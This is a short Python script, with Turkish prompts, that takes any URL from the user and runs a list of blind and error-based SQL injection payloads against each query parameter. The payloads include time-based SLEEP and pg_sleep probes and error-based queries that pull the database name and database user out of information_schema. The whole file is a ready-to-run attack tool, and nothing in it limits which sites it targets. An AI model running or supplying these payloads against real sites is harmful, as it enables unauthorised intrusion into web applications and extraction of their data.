import requests
import time
from urllib.parse import urlparse, parse_qs

def blind_sql_injection(url):
    payloads = [
    "' AND SLEEP(5) --",
    "' AND 1=(SELECT 1 FROM pg_sleep(5)) --",
    "' AND IF(1=1, SLEEP(5), 0) --",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))test) --",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(0x7e,0x27,CAST(database() AS CHAR),0x27,0x7e)) FROM `information_schema`.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM `information_schema`.tables GROUP BY x)a) --",
    "' AND (SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(0x7e,0x27,CAST(database() AS CHAR),0x27,0x7e)) FROM `information_schema`.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM `information_schema`.tables GROUP BY x)) --",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(0x7e,0x27,CAST(database() AS CHAR),0x27,0x7e)) FROM `information_schema`.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM `information_schema`.tables GROUP BY x)a) AND '1'='1 --",
    "' AND (SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(0x7e,0x27,CAST(database() AS CHAR),0x27,0x7e)) FROM `information_schema`.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM `information_schema`.tables GROUP BY x)) AND '1'='1 --",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))test) AND '1'='1 --",
    "' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))a) --",
    "' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))a) AND '1'='1 --",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(0x7e,0x27,CAST(user() AS CHAR),0x27,0x7e)) FROM `information_schema`.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM `information_schema`.tables GROUP BY x)a) --",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(0x7e,0x27,CAST(user() AS CHAR),0x27,0x7e)) FROM `information_schema`.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM `information_schema`.tables GROUP BY x)a) AND '1'='1 --",
    "' AND (SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(0x7e,0x27,CAST(user() AS CHAR),0x27,0x7e)) FROM `information_schema`.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM `information_schema`.tables GROUP BY x)) --",
    "' AND (SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(0x7e,0x27,CAST(user() AS CHAR),0x27,0x7e)) FROM `information_schema`.tables LIMIT 0,1),FLOOR(RAND(0)*2))x FROM `information_schema`.tables GROUP BY x)) AND '1'='1 --",
    "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE SLEEP(5) END) --",
    "' AND (SELECT CASE WHEN (1=2) THEN 1 ELSE SLEEP(5) END) --",
    "' AND (SELECT IF(1=1, 1, SLEEP(5))) --",
    "' AND (SELECT IF(1=2, 1, SLEEP(5))) --",
]


    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)

    for param in params:
        for payload in payloads:
            data = {param: payload}
            start_time = time.time()
            try:
                response = requests.post(url, data=data)
            except requests.exceptions.RequestException as e:
                print(f"POST isteği sırasında bir hata oluştu: {e}")
                return
            end_time = time.time()

            if end_time - start_time > 5:
                print(f'Web sitesi Blind SQL Injection saldırılarına karşı savunmasız: {payload}')
                return

    print("Web sitesi Blind SQL Injection saldırılarına karşı savunmasız görünmüyor.")

url = input("Lütfen kontrol etmek istediğiniz web sitesinin URL'sini girin: ")
blind_sql_injection(url)
